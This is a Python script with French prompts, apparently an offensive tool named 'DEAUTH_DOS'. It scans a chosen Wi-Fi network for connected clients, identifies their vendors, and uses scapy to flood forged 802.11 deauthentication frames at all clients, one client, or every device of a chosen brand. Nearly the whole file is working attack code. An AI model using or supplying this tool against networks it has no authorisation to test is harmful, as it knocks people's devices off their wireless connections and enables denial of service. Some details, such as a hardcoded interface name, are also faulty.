from scapy.all import *
import subprocess
from tabulate import tabulate
import threading
import time
import sys
from art import *
from tqdm import tqdm
from colorama import init, Fore, Style

tprint("DEAUTH_DOS")

interface = input("Entrer l'interface sans fil à utiliser : ")

commande = f"./script/monitor.sh {interface}"
subprocess.run(commande, shell=True)

def get_wifi_interface():
	result = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT, text=True)
	for line in result.split('\n'):
        	if line.startswith(interface):
        		return line.split(' ')[0]
interface_monitor = get_wifi_interface()

print("\n")
print(f"{Fore.LIGHTYELLOW_EX}{'Analyse du réseau :'}{Style.RESET_ALL}")
print("\n")


bssid = input("Entrer le bssid du reseau cible : ")
channel = int(input("Channel : "))

commande = "mkdir output"
subprocess.run(commande, shell=True)

def run_bash_programm():
        commande = f"./script/reconnaissance.sh {bssid} {channel} {interface_monitor}"
        subprocess.run(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def load_bar():
        for _ in tqdm(range(15), desc="Traitement en cours"):
                time.sleep(1)

bash_thread = threading.Thread(target=run_bash_programm)
bash_thread.start()

loading_thread = threading.Thread(target=load_bar)
loading_thread.start()

bash_thread.join()

loading_thread.join()

commande = "awk -F ',' {'print $1'} output/client-01.csv | sed '1,5d' > client.txt | chmod 700 client.txt"
subprocess.run(commande, shell=True)

commande = "rm -rf output"
subprocess.run(commande, shell=True)

print("\n")
print(f"{Fore.LIGHTYELLOW_EX}{'Machines associées au reseau :'}{Style.RESET_ALL}")
print("\n")

wireless = {}
tab_marque = []
fichier = "client.txt"
cpt=0
with open(fichier, 'r') as fichier:
	for ligne in fichier:
		if ligne.strip():
			cpt = cpt + 1
			ligne = ligne.strip()
			commande = f"oui {ligne} | head -n 1"
			marque = subprocess.check_output(commande,shell=True,text=True)
			wireless[cpt] = {"MAC": ligne, "Marque": marque.strip()}
			if marque not in tab_marque :
				tab_marque.append(marque.strip())

tableau = [[cpt, valeur["MAC"], valeur["Marque"]] for cpt, valeur in wireless.items()]
headers = ["ID", "MAC address", "Marque"]
tableau_formate = tabulate(tableau, headers=headers, tablefmt="grid")
print(tableau_formate)

commande="rm client.txt"
subprocess.run(commande, shell=True)

print("\n")
print(f"{Fore.LIGHTYELLOW_EX}{'Mise en place de l attaque :'}{Style.RESET_ALL}")
print("\n")

print("Attaque en broadcast ---> a")
print("Attaque ciblée ---> c")
print("Attaque par marque ---> m\n")
target = input("Quelle type d'attaque voulez vous effectuer : ")

if (target=="a"):
	client_mac="ff:ff:ff:ff:ff:ff"
	
	conf.iface = interface_monitor
	conf.channel = channel

	num_deauths = int(input("Nombre de paquets à envoyer : "))

	dp = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()

	for _ in range(num_deauths):
		sendp(dp, iface="wlan0mon", verbose=False)
		print(f"Paquet envoyé à {client_mac}")
	commande = f"airmon-ng stop {interface_monitor}"
	subprocess.run(commande, shell=True)
	print(f"\n Interface {interface} en mode Managed")
	
elif (target=="c"):
	identifiant = int(input("Entrer l'ID de la cible : "))
	client_mac =  wireless.get(identifiant, {}).get('MAC', None)
	
	conf.iface = interface_monitor
	conf.channel = channel

	num_deauths = int(input("Nombre de paquets à envoyer : "))

	dp = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()

	for _ in range(num_deauths):
		sendp(dp, iface="wlan0mon", verbose=False)
		print(f"Paquet envoyé à {client_mac}")
	commande = f"airmon-ng stop {interface_monitor}"
	subprocess.run(commande, shell=True)
	print(f"\n Interface {interface} en mode Managed")	
	
elif (target=="m"):
	cptm = 1
	for m in tab_marque :
		print(f"Pour attaquer les machines {m} -> taper {cptm} ")
		cptm = cptm + 1
	choix_marque = int(input("Choix : "))
	mac_marque = []
	for key, values in wireless.items():
		if values['Marque'] == tab_marque[(choix_marque-1)]:
			mac_marque.append(values['MAC'])
	
	conf.iface = interface_monitor
	conf.channel = channel

	num_deauths = int(input("Nombre de paquets à envoyer : "))

	for _ in range(num_deauths):
		for mac in mac_marque:
			dp = RadioTap() / Dot11(addr1=mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
			sendp(dp, iface="wlan0mon", verbose=False)
			print(f"Paquet envoyé à {mac}")
	commande = f"airmon-ng stop {interface_monitor}"
	subprocess.run(commande, shell=True)
	print(f"\n Interface {interface} en mode Managed")
else:
	print("Erreur cible")
	commande = f"airmon-ng stop {interface_monitor}"
	subprocess.run(commande, shell=True)
	print(f"\n Interface {interface} en mode Managed")
	exit(1)

